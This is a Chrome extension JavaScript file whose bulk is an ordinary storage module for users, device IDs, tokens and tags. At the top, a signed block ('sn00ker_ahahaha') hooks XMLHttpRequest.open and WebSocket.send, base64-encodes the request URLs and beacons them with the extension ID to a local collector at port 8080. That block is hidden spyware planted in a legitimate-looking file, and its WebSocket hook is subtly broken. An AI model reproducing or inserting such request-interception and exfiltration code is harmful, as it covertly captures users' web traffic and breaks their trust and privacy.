function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/*global _lc_utils*/

var _storage = {

  // ************************************************************************
  // *********** Device - Regular Storage ***********************************
  // ************************************************************************

  /**
   * lazy getter for device Id
   * @returns {*|o|i}
   */
  getDeviceId_Promise: function () {
    return new Promise(function(resolve, reject) {

        chrome.storage.local.get('deviceId', function (result) {

          if (chrome.runtime.lastError) {
            reject(chrome.runtime.lastError)
          } else {
            var deviceId = result.deviceId;

            if (deviceId && deviceId !== null) {
              // users object exists
              resolve(deviceId);
            } else {
              chrome.storage.local.set({'deviceId': _lc_utils.getRandomInt(16,true)}, function () {

                if (chrome.runtime.lastError) {
                  reject(chrome.runtime.lastError);
                } else {
                  chrome.storage.local.get('deviceId', function (result) {
                    resolve(result.deviceId);
                  });
                }
              })
            }
          }
        })
    })
  },

  // ************************************************************************
  // *********** Users - Sync Storage ***************************************
  // ************************************************************************

  setLastActiveDeviceId_Promise: function (deviceId) {
    //console.log('setLastActiveDeviceId_Promise ' + deviceId);
    return new Promise(function (resolve, reject) {
      chrome.storage.sync.set({'lastActiveDeviceId': deviceId}, function () {

        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError);
        } else {
          chrome.storage.sync.get('lastActiveDeviceId', function (result) {
            resolve(result[deviceId]);
          });
        }
      });
    })
  },

  getLastActiveDeviceId_Promise: function () {
    //console.log('getLastActiveDeviceId_Promise');

    return new Promise(function (resolve, reject) {
      chrome.storage.sync.get('lastActiveDeviceId', function (result) {
        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError)
        } else {
          if (result && result['lastActiveDeviceId']) {
            resolve(result['lastActiveDeviceId']);
          } else {
            resolve(null);
          }

        }
      });
    })
  },

  /**
   * lazy getter for users object
   * ids are always local user ids
   * @returns {*|o|i}
   */
  getUsers_Promise: function () {

    return new Promise(function (resolve, reject) {

      chrome.storage.sync.get('users', function (result) {

        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError)
        } else {
          var users = result.users;

          if (users && users.ids && users !== null) {
            // users object exists
            resolve(users);

          } else {
            // no 'users' key found, create one
            users = {
              'count': 0,
              'ids': [],
              'active': null
            };

            chrome.storage.sync.set({'users': users}, function () {

              if (chrome.runtime.lastError) {
                reject(chrome.runtime.lastError);

              } else {
                chrome.storage.sync.get('users', function (result) {
                  resolve(result.users);
                });
              }
            });
          }
        }
      })
    });
  },

  setUsers_Promise: function (users) {

    return new Promise(function (resolve, reject) {
      chrome.storage.sync.set({'users': users}, function () {

        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError);

        } else {
          chrome.storage.sync.get('users', function (result) {
            resolve(result.users);
          });
        }
      });

    });


  },

  /**
   * check if user is already in users object in storage
   * @param user
   */
  findUserInUsers_Promise: function (user) {

    var devices = user.devices;
    var result = undefined;

    return new Promise(function (resolve, reject) {

      return _storage.getAllUserObjects_Promise().then(function (userObjects) {

        // iterate on all locally existing users
        for (var i = 0; i < userObjects.length; i++) {

          if (!result) {

            var storageUser = userObjects[i];

            // both user and storage user has localUserId when
            if (storageUser.localUserId && user.localUserId && storageUser.localUserId === user.localUserId) {
              result = storageUser;
            }
            // storage user was authenticated and has _id
            else if (storageUser._id && user._id && storageUser._id === user._id) {
              result = storageUser;
            }
            //storage user has devices array
            else if (devices) {
              for (var j = 0; j < devices.length; j++) {

                if (!result) {
                  var device = devices[j];
                  if (device.localUserId && storageUser.localUserId && device.localUserId === storageUser.localUserId) {
                    result = storageUser;
                  }
                } else {
                  // result found, break devices loop
                  break;
                }
              }
            }// if statements end here

          } else {
            // result found, break local users loop
            break;
          }
        }
        resolve(result);
      });

    });
  },

  /**
   * add new user to users object
   * by default, the new user added will be the new active user
   * we always use localUserId for local db actions
   *
   * @param localUserId
   * @returns {*|o|i}
   */
  addUserToUsersObj_Promise: function (localUserId) {

    return _storage.getUsers_Promise().then(function (users) {

      users.ids.push(localUserId);
      users.count++;

      return _storage.setUsers_Promise(users)
    }).then(function () {
      return _storage.setActiveUser_Promise(localUserId)
    });
  },

  /**
   * remove user from users object
   * we always use localUserId for local db actions
   *
   * @param localUserId
   * @returns {*|o|i}
   */
  removeUserFromUsersObj_Promise: function (localUserId) {
    return new Promise(function (resolve, reject) {
      chrome.storage.sync.get('users', function (result) {
        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError)
        } else {
          var users = result.users;

          var i = users.ids.indexOf(localUserId);
          users.ids.splice(i, 1);
          users.count--;

          if (users.active === localUserId) {
            // we already removed the user
            if (users.ids.length >= 1) {
              users.active = users.ids[0]
            } else {
              // no more users, so next time a user logs in, he will be set as active automatically
              users.active = null;
            }
          }

          // and save the users object
          chrome.storage.sync.set({'users': users}, function () {
            if (chrome.runtime.lastError) {
              reject(chrome.runtime.lastError)
            } else {
              resolve(users);
            }
          });

        }
      })
    })
  },

  /**
   * Set the active user on users object
   * we always use localUserId for local db actions
   *
   * NOTE: this is the only place where active user is being set.
   * As so, it also calls relevant functions as refreshing local dbs to fit the new active user
   *
   * @param users - the storage users list
   * @param localUserId to set as active
   */
  setActiveUser_Promise: function (localUserId) {

    return new Promise(function (resolve, reject) {

      chrome.storage.sync.get('users', function (result) {
        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError)
        } else {

          var users = result.users;
          users.active = localUserId;

          // and save the users object
          chrome.storage.sync.set({'users': users}, function () {
            if (chrome.runtime.lastError) {
              reject(chrome.runtime.lastError)
            } else {
              // update _database of the active user and it's dbs
              return _database.getUserDatabases_Promise().then(function() {
                resolve();
              });
            }
          });
        }
      });


    });
  },

  /**
   * just get the current active user
   */
  getActiveUser_Promise: function () {

    return _storage.getUsers_Promise().then(function (users) {
      var active_user_id = users.active;

      if (active_user_id && active_user_id !== null) {
        // active user exists
        return _storage.getUser_Promise(active_user_id.toString())
      } else {
        // no active user, return null
        return null
      }
    })
  },

  /**
   * get the user object by _id
   * by default we always use localUserId for local db actions
   * @param localUserId
   * @returns {*|o|i}
   */
  getUser_Promise: function (localUserId) {

    return new Promise(function (resolve, reject) {

      localUserId = localUserId.toString();
      chrome.storage.sync.get(localUserId, function (result) {
        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError)
        } else {
          var user = result[localUserId];
          resolve(user);
        }
      })
    });
  },

  /**
   * gets device by localUserId from user object
   * if provided user object, it will search for the device in the provided user object
   * if not provided user object, it will search for the device in the existing user on storage with the provided localUserId
   *
   * @param localUserId
   * @param userObj (optional)
   */
  getUserDevice: function (localUserId, userObj) {

    var user;

    if (userObj && userObj !== null) {
      // user with devices delivered
      user = userObj;
      return _lc_utils.findObjectInArrayOfObjects(user.devices, 'localUserId', localUserId);
    } else {
      // no user delivered, go get user from storage
      return _storage.getUser_Promise(localUserId).then(function (user) {
        return _lc_utils.findObjectInArrayOfObjects(user.devices, 'localUserId', localUserId);
      })
    }


  },

  /**
   * get all the users objects from sync storage
   */
  getAllUserObjects_Promise: function () {

    var usersArray = [];

    return _storage.getUsers_Promise().then(function (users) {
      users.ids.forEach(function (localUserId) {
        usersArray.push(_storage.getUser_Promise(localUserId));
      });
      return Promise.all(usersArray);
    })


  },

  /**
   * set user object by _id
   * we always use localUserId for local db actions
   * @param user
   * @returns {*|o|i}
   */
  setUser_promise: function (user) {
    return new Promise(function (resolve, reject) {

      var jsonUser = {};
      var localUserId = user.localUserId.toString();
      jsonUser[localUserId] = user;

      chrome.storage.sync.set(jsonUser, function () {
        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError)
        } else {
          resolve(user);
        }
      })
    });
  },

  /**
   * * Create a new user
   * if oldUserObj provided, init user on _storage with oldUserObj properties if exist
   * @param userObj
   * @returns {*|o|i}
   */
  createUserInstance: function (userObj) {

    console.log('createUserInstance');

    userObj = (userObj === undefined || userObj === null) ? {} : userObj;
    var manifest = chrome.runtime.getManifest();

    // return the user object
    return {
      'localUserId': userObj.localUserId || _lc_utils.getRandomInt(16, true),
      '_id': userObj._id || undefined, // server user _id
      'isSyncUser': userObj.isSyncUser || false,
      'displayName': userObj.displayName || undefined,
      'userProvidedName': userObj.userProvidedName || undefined,
      'email': userObj.email || undefined,
      'appVersion': userObj.version || manifest.version,
      'ip': userObj.ip || undefined,
      'country': userObj.country || undefined,
      'lan': userObj.lan || undefined,
      'browser': userObj.browser || 'chrome',
      'browserVersion': userObj.browserVersion || _lc_utils.getChromeVersion(),
      'os': userObj.os || undefined,
      'tags': userObj.tags || [],
      'created': userObj.created || Date.now(),
      'modified': userObj.modified || Date.now(),
      'verb': userObj.verb || 'create',

      'isSkipLogin': userObj.isSkipLogin,

      'dbs': [] // dbId is added only by the creator of the db
    };

  },

  /**
   * save a user object to storage
   * @param user
   * @returns {*}
   */
  saveUserToStorage_Promise: function (user) {

    console.log('saveUserToStorage_Promise');

    var jsonUser = {};
    jsonUser[user.localUserId] = user;

    return new Promise(function (resolve, reject) {
      chrome.storage.sync.set(jsonUser, function () {
        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError)
        } else {
          _storage.addUserToUsersObj_Promise(user.localUserId).then(function () {
            resolve(user)
          });
        }
      })
    });
  },

  /**
   * * update user
   * if no existing user delivered, will update the active user.
   *
   * case 1 - new app version / new chrome version / user refreshes extension
   * case 2 - user signup / signin to server (must have options)
   *
   * @param newUserData
   * @param existingUser
   * @returns {*}
   */
  updateUser_Promise : function (newUserData, existingUser) {
    console.log('updating user on _storage');

    if (existingUser) {
      return _storage._doUpdateUser_Promise(newUserData, existingUser)
    }
    // if no existing user delivered, we update the active user
    else {
      return _storage.getActiveUser_Promise().then(function (existingUser) {
        return _storage._doUpdateUser_Promise(newUserData, existingUser);
      })
    }
  },

  /**
   * worker function for updating user
   * @param newUserData
   * @param existingUser
   */
  _doUpdateUser_Promise: function (newUserData, existingUser) {

    console.log('_doUpdateUser_Promise');
    console.log(newUserData);

    var dbsPromisesArray = []; //in case dbs creation will be needed
    var dbOptions;

    var isRemoteUpdate = (newUserData.userType === 'signin' || newUserData.userType === 'signup'); // in case this user update came from server
    var userType = newUserData.userType; // signin or signup or skip
    var manifest = chrome.runtime.getManifest();
    var check = {
      browserVersion: _lc_utils.getChromeVersion(),
      appVersion: manifest.version
    };

    // make sure removed special document members to avoid conflicts
    delete newUserData.__v;
    delete newUserData.created;
    delete newUserData.userType;
    delete newUserData.isAuthenticated;

    // if there are NEW KEYS and only if they are DIFFERENT FROM EXISTING ONES, insert them.
    Object.keys(newUserData).forEach(function (key) {
      if (!existingUser[key] || existingUser[key] === '' || existingUser[key] == null) {
        // don't put in undefined
        if (newUserData[key]) {
          existingUser[key] = newUserData[key]
        }
      }
    });

    // update browser and app version related data
    Object.keys(check).forEach(function (key) {
      existingUser[key] = check[key]
    });

    //these must be updated anyway
    existingUser.verb = 'update';

    // in case of user coming from server, update tokens
    if (isRemoteUpdate && newUserData.access_token) {
      existingUser.access_token = newUserData.access_token;
      existingUser.access_token_expires = newUserData.access_token_expires;
    }
    if (isRemoteUpdate && newUserData.cloudantApiKey && newUserData.cloudantApiPassword) {
      existingUser.cloudantApiKey = newUserData.cloudantApiKey;
      existingUser.cloudantApiPassword = newUserData.cloudantApiPassword;
    }

    // activate sync flag in case user logged in (will have an _id key)
    if (newUserData._id && !existingUser.isSyncUser) {
      existingUser.isSyncUser = true;
    }

    // update user dbs if needed
    if (isRemoteUpdate) {
      //store new dbs changes
      for (var i = 0; i < newUserData.dbs.length; i++) {
        if (existingUser.dbs.indexOf(newUserData.dbs[i]) === -1) {

          existingUser.dbs.push(newUserData.dbs[i]);

          var isCreateMeta = (userType==='signup');
          var isCreateDdocs = (userType==='signup');

          dbOptions = {
            dbId: newUserData.dbs[i],
            isCreateRemote: false,
            isCreateMeta: isCreateMeta,
            isCreateDdocs: isCreateDdocs
          };
          // create the databases on the existing user (dbIds provided)
          dbsPromisesArray.push(_database.createNewDatabase_Promise(existingUser, dbOptions));
        }
      }
    }

    // if skip login - create the first 'General' new db (IF THERE ARE NO DBS YET !!!)
    // (in case user did not skip login and signed up,
    // the server will create the first new db and send it back in the response)
    if (!isRemoteUpdate && userType==='skip' && existingUser.dbs.length === 0 ) {

      console.log('skip login user first time');

      var dbId = _lc_utils.createUUID({beginWithLetter: true});

      dbOptions = {
        dbId: dbId,
        isCreateRemote: false,
        isCreateDdocs: true,
        isCreateMeta: true
      };

      existingUser.dbs.push(dbId);
      dbsPromisesArray.push( _database.createNewDatabase_Promise(existingUser, dbOptions));
    }


    return Promise.all(dbsPromisesArray).then(function () {
      // and set the user to local storage
      return _storage.setUser_promise(existingUser)
    }).then(function (user) {
      //handle remote stuff
      if (isRemoteUpdate) {
        var promisesArray = [
          _remote_database.updateRemoteUser_Promise(user),
          _remote_database.syncAllUserDbs_Promise(user) // not here
        ];
        return Promise.all(promisesArray)
      }
    }).then(function() {
      return existingUser;
    })

  },

  /**
   * update user.dbs array on _storage user object.
   * this is called in case of adding new db
   * @param localUserId
   * @param dbId
   */
  updateUserDatabases_Promise: function (localUserId, dbId) {
    return _storage.getUser_Promise(localUserId).then(function (user) {
      if (user.dbs.indexOf(dbId) === -1) {
        user.dbs.push(dbId)
      }
      return _storage.setUser_promise(user)
    })
  },

  /**
   * check if the tag already exists in the user's tags
   * if not, add new tags
   * TODO: everytime there is a new tag the user object gets updated.
   * TODO: change it so in case of new tag append, user does not change (with passing a 'reason' for update to updateUser_Promise)
   *
   * @param localUserId
   * @param tags
   * @param isUpdateRemote - boolean. if true, will update remote user on changes. otherwise will only update local user
   * @returns {*}
   */
  updateUserTags_Promise: function (localUserId, tags, isUpdateRemote) {

    return _storage.getUser_Promise(localUserId).then(function (user) {
      return _storage.checkIsNewTag_Promise(user, tags)
    }).then(function (results) {
      if (results.isNewTagExist) {
        // just set the user with the new tags, no need for full update
        return _storage.setUser_promise(results.user).then(function () {
          // update remote user
          if (isUpdateRemote) {
            return _remote_database.updateRemoteUserTags_Promise(results.user)
          }
        })
      } else {
        // no new tags, just return user
        return results.user
      }
    })
  },

  /**
   * worker function to check if there is a new tag to append to user's tags list
   * @param user
   * @param tags
   * @returns {*|o|i}
   */
  checkIsNewTag_Promise: function (user, tags) {

    var results = {
      isNewTagExist: false,
      user: user
    };

    return new Promise(function (resolve, reject) {
      // check if tag already exists, if not add it
      for (var i = 0; i < tags.length; i++) {
        var newTag = tags[i];
        var index = -1;
        for (var j = 0; j < results.user.tags.length; j++) {
          if (results.user.tags[j].text == newTag.text) {
            index = j;
            break;
          }
        }
        if (index == -1) {
          results.user.tags.push(newTag);
          results.isNewTagExist = true;
        }
      }
      resolve(results)
    })
  }

};